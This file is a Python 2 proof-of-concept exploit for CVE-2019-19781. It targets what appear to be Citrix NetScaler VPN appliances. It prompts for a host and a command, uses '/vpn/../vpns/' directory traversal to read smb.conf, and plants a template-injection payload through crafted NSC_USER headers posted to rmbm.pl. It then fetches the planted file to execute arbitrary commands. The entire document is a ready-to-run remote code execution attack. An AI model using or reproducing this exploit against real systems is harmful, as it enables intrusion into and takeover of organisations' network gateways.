import requests
print '-------------------------------------------'
print '[+] POC for CVE-2019-19781 using rmbm.pl[+]'
print '[+] Author: Akbar		       [+]'
print '[+] Exploit responsibly!	               [+]'
print '-------------------------------------------'

url = raw_input('Enter the url without http/https:\n')
cmd = raw_input('Enter the command to execute:\n')

#Check whether Directory traversal is exploitable
#Read the default smb.conf file

print 'Checking whether the Directory traversal is exploitable'
first = requests.get("https://"+url+"/vpn/../vpns/cfg/smb.conf")
if first:
	print('Okay! Got 200. The contents of smb.conf is:\n')
	print(first.text)
else:
	print('Seems like fixed! Try harder!')


#To create
print 'Creating the XML file for RCE now! be patient'

headers={
	"Host":url,
	"NSC_USER": "../../../../netscaler/portal/templates/gggg[%template.new({'BLOCK'='print`id`'})%]",
	"NSC_NONCE": "gggg",
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate",
	"Cookie": "NSC_TASS=https://"+ url
}

data = {'UI_inuse': 'RfWeb'}

req = requests.post("https://"+url+"/vpn/../vpns/portal/scripts/rmbm.pl", headers=headers, data=data)
if req:
	print('The website is responsive. got 200. creating the exploit\n')
	print('The exploit has been created!')
else:
	print('Exploit Failed! Check manually')


#To fetch
headerss={
"Host": url,
"NSC_USER":"../../../../netscaler/portal/templates/gggg[%template.new({'BLOCK'='print`cmd`'})%]",
"NSC_NONCE":"gggg",
"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Cookie":"pwcount=2"
}

res = requests.get("https://"+url+"/vpn/../vpns/portal/gggg[%25template.new({'BLOCK'%3d'print`"+cmd+"`'})%25].xml",headers=headerss)
if res:
	print('The website is responsive. got 200\n')
	print(res.text)
else:
	print('Exploit Failed')
